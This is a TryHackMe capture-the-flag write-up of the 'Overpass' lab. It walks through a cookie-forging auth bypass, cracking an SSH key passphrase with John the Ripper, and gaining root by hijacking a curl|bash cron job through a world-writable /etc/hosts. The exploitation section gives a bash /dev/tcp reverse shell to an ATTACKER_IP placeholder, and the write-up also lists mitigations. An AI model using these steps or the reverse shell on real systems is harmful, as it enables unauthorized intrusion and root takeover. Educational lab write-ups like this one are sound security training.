```
 ██████╗ ██╗   ██╗███████╗██████╗ ██████╗  █████╗ ███████╗███████╗
██╔═══██╗██║   ██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔════╝
██║   ██║██║   ██║█████╗  ██████╔╝██████╔╝███████║███████╗███████╗
██║   ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗██╔═══╝ ██╔══██║╚════██║╚════██║
╚██████╔╝ ╚████╔╝ ███████╗██║  ██║██║     ██║  ██║███████║███████║
 ╚═════╝   ╚═══╝  ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
                     TryHackMe — Overpass
```

> 👤 **Author:** farhan | 📅 **Date:** 2026-10-23 | 🏠 **Platform:** TryHackMe | 💀 **Difficulty:** Easy | ⭐ **Rating:** ⭐⭐⭐☆☆

> ⏱️ ~8 min read

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#️-tools-used)
- [TL;DR](#-tldr)
- [Introduction](#-introduction)
- [Recon](#-recon)
- [Foothold](#-foothold)
- [Shell / Access](#-shell--access)
- [Escalation](#-escalation)
- [Exploitation](#-exploitation)
- [Rabbit Holes](#-rabbit-holes)
- [Flag](#-flag)
- [Mitigations](#️-mitigations)
- [Key Takeaway](#-key-takeaway)
- [If I Did It Again](#-if-i-did-it-again)
- [Changelog](#-changelog)

---

## Progress Checklist

- [x] Port scan — SSH (22), HTTP (80/Golang net/http)
- [x] Web recon — "Overpass" password manager; `gobuster` found `/admin`, `/aboutus`, `/downloads`
- [x] Read `/login.js` in DevTools — found client-side-only session check
- [x] Set `SessionToken` cookie to an arbitrary value → `/admin` unlocked
- [x] Pulled passphrase-protected RSA private key for `james` from `/admin`
- [x] `ssh2john id_rsa > hash` → `john` with rockyou.txt → passphrase `james13`
- [x] SSH login as `james` with cracked key → retrieved `user.txt`
- [x] `cat /etc/crontab` → root job: `curl overpass.thm/downloads/src/buildscript.sh | bash`
- [x] `ls -la /etc/hosts` → world-writable (`-rw-rw-rw-`)
- [x] Served malicious `buildscript.sh` + poisoned `/etc/hosts` → root reverse shell
- [x] Retrieved `root.txt` from `/root`

---

## 🛠️ Tools Used

- 🔎 Nmap — port scanning and service detection
- 🌐 gobuster — web content/directory discovery
- 🖥️ Browser DevTools — reading `login.js`, setting the `SessionToken` cookie
- 🔑 ssh2john / John the Ripper — cracking the RSA key passphrase
- 🐚 SSH — authenticated shell as `james`
- 🐍 python3 http.server — serving the malicious `buildscript.sh`
- 📡 netcat — catching the root reverse shell

---

## ⚡ TL;DR

Overpass serves a Go-based "password manager" on port 80. `gobuster` finds `/admin`, whose login is gated entirely in the browser — `login.js` stores whatever the API returns as a `SessionToken` cookie, and the admin page only checks that the cookie *exists*. Setting that cookie to anything unlocks a page holding a passphrase-protected RSA key for `james`. `ssh2john` + `john` crack the passphrase (`james13`), and the key logs in over SSH. On the box, root's crontab runs `curl overpass.thm/downloads/src/buildscript.sh | bash` every minute, and `/etc/hosts` is world-writable — point the hostname at your own box, serve a reverse shell as the script, and root connects back in under sixty seconds.

---

## 📖 Introduction

**Overpass** is a THM Easy box built around a textbook **broken authentication** flaw (OWASP A07:2021) and a classic **remote-code-execution-by-cron** privesc. The foothold needs no exploit code at all — just reading the JavaScript the server already hands you and noticing it never actually checks anything. The escalation is a `curl | bash` pattern running as root, made trivially hijackable by a world-writable `/etc/hosts`. Neither step involves a CVE; both are configuration and design failures that show up in real environments constantly.

### Prerequisites

Readers should know:
- How browser DevTools can be used to read client-side JavaScript and set cookies manually
- Why client-side-only authentication checks are fundamentally broken
- What `ssh2john` / John the Ripper are for and how to crack a passphrase-protected SSH key
- How `/etc/hosts` resolution works and why a world-writable copy of it is dangerous

---

## 🔍 Recon

*(~5 mins)*

### Port Scan

```bash
nmap -sC -sV -oN nmap_initial.txt 10.10.x.x
```

| Port | Service | Version / Detail |
| --- | --- | --- |
| 22/tcp | SSH | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 80/tcp | HTTP | Golang net/http server — "Overpass" |

Two ports. The HTTP server is a Go binary advertising itself as a "military-grade, open-source password manager." No obvious framework CVEs to chase — this is custom code.

### Web Enumeration

```bash
gobuster dir -u http://10.10.x.x -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt
```

| URL | Notes |
| --- | --- |
| `/admin` | Login form |
| `/aboutus` | Static page |
| `/downloads` | App's own Go source + binaries |
| `/css`, `/img` | Static assets |

`/admin` is the obvious target. `/downloads` looks tempting but turns out to be a distraction (see Rabbit Holes).

---

## 🚪 Foothold

*(~10 mins)*

### Reading login.js

Before touching the form, DevTools → Sources → `login.js`:

```javascript
async function login() {
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```

The API returns either the literal string `"Incorrect credentials"` or a token. The client treats *anything else* as valid and stores it. `/admin` itself only checks that `SessionToken` exists — there's no server-side session table being consulted at all. This is an IDOR's cousin: not "guess someone else's ID," but "there was never a lock on the door."

### Setting the Cookie

```javascript
document.cookie = "SessionToken=whatever"
```

Reload `/admin`. The panel renders a note to James and, beneath it, his RSA private key:

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337
...
-----END RSA PRIVATE KEY-----
```

`Proc-Type: 4,ENCRYPTED` — passphrase-protected. The key alone isn't enough.

### Cracking the Passphrase

```bash
chmod 600 id_rsa
ssh2john id_rsa > james_hash
john --wordlist=/usr/share/wordlists/rockyou.txt james_hash
```

```
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
james13          (id_rsa)
```

**Credentials found:**

| Username | Key passphrase | Service |
| --- | --- | --- |
| `james` | `james13` | SSH (via private key) |

---

## 🐚 Shell / Access

*(~12 mins)*

### SSH as james

```bash
ssh -i id_rsa james@10.10.x.x
# Enter passphrase for key 'id_rsa': james13
```

```
james@overpass-prod:~$ id
uid=1001(james) gid=1001(james) groups=1001(james)
```

Already a full TTY via SSH — no `script`/PTY upgrade needed.

### User Flag

```bash
cat ~/user.txt
```

```
thm{65c1aaf000506e56996822c6281e6bf7}
```

---

## 📈 Escalation

*(~15 mins)*

### Crontab

```bash
cat /etc/crontab
```

```
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

Every minute, **root** fetches a script by hostname and pipes it straight to `bash`. No pinned IP, no signature check — whatever `overpass.thm` resolves to, root executes.

### Can james control resolution?

```bash
ls -la /etc/hosts
```

```
-rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts
```

World-writable. `james` can add an entry for `overpass.thm` and the root cron will fetch from wherever we point it.

---

## 💥 Exploitation

The complete attack chain:

1. **Broken client-side auth** — `/admin` trusts cookie presence, not validity → leaked RSA key for `james`
2. **Passphrase crack** — `ssh2john` + `john` → `james13` → SSH access
3. **Crontab enum** — root runs `curl overpass.thm/... | bash` every minute
4. **`/etc/hosts` hijack** — world-writable, redirect `overpass.thm` to attack box
5. **Payload delivery** — serve malicious `buildscript.sh` → root reverse shell → root flag

### Step-by-Step

Build the payload tree matching the cron's requested path:

```bash
mkdir -p ~/overpass/downloads/src && cd ~/overpass
cat > downloads/src/buildscript.sh <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
```

```bash
nc -lvnp 4444
```

```bash
sudo python3 -m http.server 80
```

Poison resolution on the target:

```bash
echo "ATTACKER_IP overpass.thm" >> /etc/hosts
```

Within a minute:

```
10.10.x.x - - [GET /downloads/src/buildscript.sh HTTP/1.1] 200 -
connect to [ATTACKER_IP] from (UNKNOWN) [10.10.x.x] 49876
root@overpass-prod:/#
```

```bash
cat /root/root.txt
```

```
thm{7f336f8c359dbac18d54fdd64ea753bb}
```

---

## 🐇 Rabbit Holes

### SQLi Fuzzing on /api/login

First instinct on seeing `/api/login` was to throw `' OR 1=1--` at it. It's a Go `net/http` handler with no SQL anywhere near the login decision — a few minutes wasted before doing the obvious thing and reading the client JS. The vuln was sitting in plaintext in the browser the entire time.

### The /downloads Source Dive

`/downloads` serves the full Go source for the "Overpass" app. Spent a while reversing it for hardcoded secrets or a crypto flaw in password storage. There's a vulnerable-looking weak-encryption routine in there, but it's a dead end for *this* path — the crontab is the intended route and far shorter.

### SUID Hunting

Ran `find / -perm -4000 2>/dev/null` out of habit. Nothing unusual — stock `sudo`, `passwd`, `mount`. Cost nothing but attention; the crontab was the real answer and should have been checked first.

### Port 80 Permission Error

First attempt at `python3 -m http.server 80` without `sudo` → `PermissionError: [Errno 13]`. Port 80 is privileged. Thirty-second facepalm, fixed with `sudo`.

---

## 🏁 Flag

| Flag | Value | Location |
| --- | --- | --- |
| User | `thm{65c1aaf000506e56996822c6281e6bf7}` | `~james/user.txt` |
| Root | `thm{7f336f8c359dbac18d54fdd64ea753bb}` | `/root/root.txt` |

---

## 🛡️ Mitigations

| Vulnerability | Severity | Mitigation |
| --- | --- | --- |
| Client-side-only session validation on `/admin` | Critical | Validate session tokens server-side against a real session store on every protected request; never trust cookie presence alone |
| Passphrase-protected private key exposed via web UI | High | Never serve private keys through any web interface; distribute credentials via a secrets manager with audit logging |
| Weak key passphrase (`james13`), crackable via rockyou.txt | Medium | Enforce stronger passphrase policy for SSH keys; consider hardware-backed keys for sensitive accounts |
| Root cron executing remote script fetched by hostname (`curl \| bash`) | Critical | Never pipe network content into a privileged shell; pin to a fixed IP over TLS and verify a signature/checksum before execution |
| World-writable `/etc/hosts` (`0666`) | Critical | `chmod 644 /etc/hosts`; audit `/etc` for unexpected write permissions with `find /etc -writable -not -user root` |

---

## 💡 Key Takeaway

> 💡 **Takeaway:** Broken authentication doesn't need to be subtle to be devastating — here it was "the server trusts a cookie it never issued." Read client-side JavaScript *before* attacking the server; the logic flaw is often sitting there in plaintext. On the privesc side, `curl | bash` as root is a standing invitation — check crontabs and world-writable `/etc` files before reaching for linpeas.

---

## 🔁 If I Did It Again

Open DevTools on `/admin` before opening a terminal at all — the whole foothold lives in `login.js`, and the SQLi detour was pure wasted motion. After landing as `james`, the first three commands should be `cat /etc/crontab`, `ls -la /etc/hosts`, and `find /etc -writable -not -user root` — not a full enumeration script. The intended path reveals itself in under ten seconds once you look in the right place.

---

## 🔚 Changelog

*Last updated: 2026-10-23*

---

[↑ Back to top](#)
